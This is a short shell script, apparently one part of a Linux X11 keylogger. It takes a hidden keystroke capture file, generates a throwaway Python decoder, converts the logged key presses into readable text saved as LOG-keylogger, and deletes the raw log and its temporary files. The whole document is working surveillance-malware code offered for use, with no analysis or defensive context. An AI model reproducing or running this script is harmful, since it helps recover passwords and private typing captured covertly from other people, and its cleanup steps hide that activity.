#!/bin/sh
cat .xkey.log | grep keycode > xmodmap.pke
cat .xkey.log | grep 'key p' > xlog
rm -f .xkey.log
#Generating some Python to do the decoding
echo 'import re, collections, sys' > decoder.py
echo 'from subprocess import *' >> decoder.py
echo 'def keyMap():' >> decoder.py
echo ' table = open("xmodmap.pke")' >> decoder.py
echo ' key = []' >> decoder.py
echo ' for line in table:' >> decoder.py
echo " m = re.match('keycode +(\d+) = (.+)', line.decode())" >> decoder.py
echo ' if m and m.groups()[1]:' >> decoder.py
echo ' key.append(m.groups()[1].split()[0]+"_____"+m.groups()[0])' >> decoder.py
echo ' return key' >> decoder.py
echo 'def printV(letter):' >> decoder.py
echo ' key=keyMap();' >> decoder.py
echo ' for i in key:' >> decoder.py
echo ' if str(letter) == i.split("_____")[1]:' >> decoder.py
echo ' return i.split("_____")[0]' >> decoder.py
echo ' return letter' >> decoder.py
echo 'if len(sys.argv) < 2:' >> decoder.py
echo ' print "Usage: %s FILE" % sys.argv[0];' >> decoder.py
echo ' exit();' >> decoder.py
echo 'else:' >> decoder.py
echo ' f = open(sys.argv[1])' >> decoder.py
echo ' lines = f.readlines()' >> decoder.py
echo ' f.close()' >> decoder.py
echo ' for line in lines:' >> decoder.py
echo " m = re.match('key press +(\d+)', line)" >> decoder.py
echo ' if m:' >> decoder.py
echo ' keycode = m.groups()[0]' >> decoder.py
echo ' print (printV(keycode))' >> decoder.py

echo 'Please see LOG-keylogger for the output......'
python decoder.py xlog > LOG
sed ':a;N;$!ba;s/\n/ /g' LOG > LOG-keylogger
rm -f LOG
rm -f xmodmap.pke
rm -f decoder.py
rm -f xlog
cat LOG-keylogger
